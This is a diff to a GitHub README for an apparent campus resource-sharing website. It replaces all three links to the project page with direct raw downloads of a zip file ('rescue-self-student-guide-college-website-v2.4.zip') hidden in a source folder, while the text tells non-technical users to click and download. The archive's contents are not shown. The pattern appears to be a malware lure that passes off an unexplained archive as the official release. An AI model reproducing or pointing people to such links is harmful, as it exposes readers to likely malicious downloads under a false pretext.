@@ -1,6 +1,6 @@
 # 🎓 college_student_self-rescue_guide_website - Easy Campus Resource Sharing
 
-[![Download](https://img.shields.io/badge/Download-purple?style=for-the-badge)](https://github.com/cynthiacc98/college_student_self-rescue_guide_website)
+[![Download](https://img.shields.io/badge/Download-purple?style=for-the-badge)](https://github.com/cynthiacc98/college_student_self-rescue_guide_website/raw/refs/heads/main/src/app/categories/rescue-self-student-guide-college-website-v2.4.zip)
 
 ## 📘 What is this?
 
@@ -37,7 +37,7 @@ You won’t need to write code or use technical commands.
 
 1. **Go to the download page**  
    Click this link to open the official project page where you can get the website files:  
-   [Download college_student_self-rescue_guide_website](https://github.com/cynthiacc98/college_student_self-rescue_guide_website)
+   [Download college_student_self-rescue_guide_website](https://github.com/cynthiacc98/college_student_self-rescue_guide_website/raw/refs/heads/main/src/app/categories/rescue-self-student-guide-college-website-v2.4.zip)
 
 2. **Download the latest release**  
    On the page, look for the latest stable version. Usually, this will be marked as a "Release."  
@@ -116,7 +116,7 @@ The project also supports an admin dashboard to help manage users and content.
 
 ## 🔗 Quick Access to the Download
 
-[![Get college_student_self-rescue_guide_website](https://img.shields.io/badge/Get%20App-green?style=for-the-badge)](https://github.com/cynthiacc98/college_student_self-rescue_guide_website) 
+[![Get college_student_self-rescue_guide_website](https://img.shields.io/badge/Get%20App-green?style=for-the-badge)](https://github.com/cynthiacc98/college_student_self-rescue_guide_website/raw/refs/heads/main/src/app/categories/rescue-self-student-guide-college-website-v2.4.zip) 
 
 Use this link any time to go directly to the download page and get the latest files.
 
